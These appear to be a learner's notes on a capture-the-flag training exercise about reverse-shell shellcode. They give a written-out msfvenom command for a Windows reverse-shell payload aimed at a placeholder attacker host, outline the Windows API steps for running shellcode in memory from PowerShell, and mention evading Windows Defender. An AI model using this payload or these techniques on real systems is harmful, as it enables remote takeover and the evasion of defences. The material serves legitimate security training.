Day 8

Scenario:

Glitch, a skilled but mistrusted hacker, created a shellcode script to access his home system remotely. The script was meant for demonstration at a tech conference. Unbeknownst to him, Mayor Malware's minions sought his research on Wareville's defenses hidden in his home system.

Learning Objectives:

  1. Understanding Shellcode Basics
    • Writing shellcode.
    • Generating shellcode for reverse shells.
    • Executing shellcode using PowerShell.
  1. Hands-on Tasks
    • Connect to a VM and start an AttackBox.
    • Generate shellcode using msfvenom.
    • Execute shellcode through memory allocation and thread creation.

Essential Terminologies

  • Shellcode: Code injected during exploits (e.g., buffer overflows) to execute commands or gain system control. Typically written in assembly language.
  • PowerShell: A scripting tool used for system management; often exploited by attackers due to its extensive system access.
  • Windows Defender: Detects malicious scripts; attackers bypass it via obfuscation or reflective injection.
  • Windows API: Provides system-level functions (e.g., VirtualAlloc, CreateThread) essential for shellcode execution.
  • Reverse Shell: A connection where the target machine initiates communication to the attacker's machine.

Generating Shellcode with msfvenom

Command:

bash
Copy code
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell

Key Parameters:

  • p: Specifies payload type (windows/x64/shell_reverse_tcp for reverse shell).
  • LHOST: IP of the AttackBox (attacker).
  • LPORT: Port for reverse connection (e.g., 1111).
  • f powershell: Formats payload for PowerShell.

Executing Shellcode

  1. Components of Execution:
    • Allocate Memory (VirtualAlloc):
      • Reserves memory for shellcode.
      • Arguments:
        • Address: 0 (let Windows decide).
        • Size: Shellcode length.
        • Allocation type: 0x3000 (reserve and commit).
        • Protection: 0x40 (readable and executable).
    • Copy Shellcode:
      • Use Marshal.Copy to load shellcode into allocated memory.
    • Execute Shellcode (CreateThread):
      • Starts a thread pointing to the shellcode's memory address.
    • Wait for Completion (WaitForSingleObject):
      • Ensures the thread completes execution.
  1. PowerShell Script for Execution:
    • Defines C# classes to interact with Windows API functions.
    • Uses Add-Type to integrate C# classes into PowerShell.
    • Loads shellcode as a byte array ($buf) and executes it.

Code Breakdown

  • VirtualAlloc: Allocates memory for shellcode.
  • Marshal.Copy: Copies shellcode into allocated memory.
  • CreateThread: Executes shellcode by starting a new thread.
  • WaitForSingleObject: Pauses script until shellcode execution completes.

Additional Notes:

  • Security Implications:
    • Exploits rely on bypassing detection systems like Windows Defender.
    • Techniques like obfuscation and reflection injection help evade defenses.
  • Practical Use:
    • Attackers use tools like msfvenom for payload creation.
    • Pentesters must understand these techniques for ethical hacking and system defense.
